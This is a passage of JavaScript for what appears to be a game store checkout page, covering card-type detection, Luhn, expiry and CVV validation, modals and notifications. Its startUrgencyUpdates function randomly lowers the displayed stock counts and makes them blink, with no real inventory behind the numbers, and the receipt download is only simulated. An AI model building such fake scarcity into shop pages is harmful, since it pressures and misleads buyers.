    }
}

// Download receipt (simulated)
function downloadReceipt() {
    showNotification('📄 Receipt download started...', 'info');
    
    // Simulate download delay
    setTimeout(() => {
        showNotification('✅ Receipt saved to Downloads folder', 'success');
    }, 1500);
}

// Close Email Modal
function closeEmailModal() {
    const modal = document.getElementById('emailModal');
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
        
        const form = document.getElementById('emailForm');
        if (form) {
            form.reset();
        }
        
        const errorInputs = document.querySelectorAll('.error');
        errorInputs.forEach(input => input.classList.remove('error'));
    }
}

// Close payment modal
function closePaymentModal() {
    const modal = document.getElementById('paymentModal');
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
        
        const form = document.getElementById('paymentForm');
        if (form) {
            form.reset();
        }
        
        const errorInputs = document.querySelectorAll('.error');
        errorInputs.forEach(input => input.classList.remove('error'));
        
        const errorMessages = document.querySelectorAll('.field-error');
        errorMessages.forEach(msg => msg.remove());
    }
}

// Detect card type from number
function detectCardType(cardNumber) {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    
    for (const [type, config] of Object.entries(CARD_BINS)) {
        for (const bin of config.bins) {
            if (cleanNumber.startsWith(bin)) {
                return type;
            }
        }
    }
    
    return null;
}

// Update card type icon with enhanced styling
function updateCardTypeIcon(cardType) {
    const cardTypeIcon = document.getElementById('cardTypeIcon');
    
    if (cardTypeIcon) {
        cardTypeIcon.className = 'card-type-icon';
        if (cardType) {
            cardTypeIcon.classList.add(cardType);
            cardTypeIcon.classList.add('detected');
        }
    }
}

// Validate card number using Luhn algorithm
function validateCardNumber(cardNumber, cardType) {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    
    if (!cardType || !cleanNumber) return false;
    
    const expectedLengths = CARD_BINS[cardType].lengths;
    if (!expectedLengths.includes(cleanNumber.length)) return false;
    
    return luhnCheck(cleanNumber);
}

// Luhn algorithm implementation
function luhnCheck(cardNumber) {
    let sum = 0;
    let alternate = false;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let n = parseInt(cardNumber.charAt(i), 10);
        
        if (alternate) {
            n *= 2;
            if (n > 9) {
                n = (n % 10) + 1;
            }
        }
        
        sum += n;
        alternate = !alternate;
    }
    
    return (sum % 10) === 0;
}

// Validate card expiry
function validateCardExpiry(expiry) {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    
    const [month, year] = expiry.split('/').map(n => parseInt(n, 10));
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    
    if (month < 1 || month > 12) return false;
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
    
    return true;
}

// Validate CVV
function validateCVV(cvv, cardType) {
    const expectedLength = cardType === 'amex' ? 4 : 3;
    return cvv.length === expectedLength && /^\d+$/.test(cvv);
}

// Email validation
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Animation and scroll effects
function initializeAnimations() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);
    
    document.querySelectorAll('.game-details, .customer-reviews, .related-games').forEach((section, index) => {
        section.style.opacity = '0';
        section.style.transform = 'translateY(30px)';
        section.style.transition = `opacity 0.6s ease ${index * 0.2}s, transform 0.6s ease ${index * 0.2}s`;
        observer.observe(section);
    });
}

// Start urgency updates
function startUrgencyUpdates() {
    setInterval(() => {
        const stockIndicators = document.querySelectorAll('.stock-indicator, .stock-warning');
        
        stockIndicators.forEach(indicator => {
            if (Math.random() < 0.1) {
                const currentText = indicator.textContent;
                const currentNumber = parseInt(currentText.match(/\d+/)?.[0] || '3');
                
                if (currentNumber > 1) {
                    const newNumber = currentNumber - 1;
                    indicator.textContent = currentText.replace(/\d+/, newNumber.toString());
                    
                    if (newNumber <= 1) {
                        indicator.style.background = '#c0392b';
                        indicator.style.animation = 'urgent-blink 0.8s infinite';
                    }
                }
            }
        });
    }, 30000);
}

// Utility sleep function
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Enhanced notification system
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    const colors = {
        'success': '#27ae60',
        'error': '#e74c3c',
        'info': '#0866ff',
        'warning': '#f39c12'
    };
    
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 12px;
        color: white;
        font-weight: 600;
        z-index: 10001;
        max-width: 350px;
        white-space: pre-line;
        animation: slideInRight 0.3s ease;
        box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        border-left: 4px solid rgba(255,255,255,0.3);
        backdrop-filter: blur(10px);
        background: ${colors[type] || colors['info']};
    `;
    
    notification.textContent = message;
    
    // Add animation styles if not exists
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            @keyframes slideInRight {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOutRight {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Auto remove
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease';
        setTimeout(() => {
            if (document.body.contains(notification)) {
                document.body.removeChild(notification);
            }
        }, 300);
    }, 4000);
    
    // Click to dismiss
    notification.addEventListener('click', function() {
        this.style.animation = 'slideOutRight 0.3s ease';
        setTimeout(() => {
            if (document.body.contains(this)) {
                document.body.removeChild(this);
            }
        }, 300);
    });
}

// Initialize page
console.log('🎮 Enhanced Realistic Payment System Loaded!');
console.log('🔄 Features: Multi-step processing, realistic delays, enhanced validation');
console.log('🎭 Professional UI with security indicators and smooth animations');